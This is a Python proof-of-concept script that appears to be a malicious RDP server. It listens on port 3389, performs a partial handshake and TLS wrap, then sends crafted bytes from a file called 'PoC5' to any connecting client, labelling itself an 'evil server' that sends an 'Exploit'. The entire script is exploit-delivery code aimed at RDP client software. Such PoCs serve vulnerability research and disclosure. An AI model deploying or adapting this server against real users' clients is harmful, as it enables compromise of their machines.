import socket
import sys
import binascii
import mmap
import socket, ssl

f = open("PoC5", "r+b")
mm = mmap.mmap(f.fileno(), 0)


# Socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 3389)
print("PoC5: evil server started on %s port %s" % server_address)
sock.bind(server_address)
sock.listen(1)

while True:
	print('waiting for a connection')
	connection, client_address = sock.accept()

	try:
		print('connection from ' + str(client_address))
		data = '';

		# PDU 1
		tmp = connection.recv(45)
		connection.sendall(mm[0:19])

		#context.set_ciphers("ADH-AES256-SHA")
		context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
		context.load_cert_chain(certfile="cert.pem", keyfile="key.pem", password="pass")		
		connstream = context.wrap_socket(connection, server_side=True)

		# PDU 2
		tmp = connstream.recv(93)
		connstream.sendall(mm[19:211])

		print('Exploit send to the client')
		
            
	finally:
		# Clean up the connection
		connection.close()
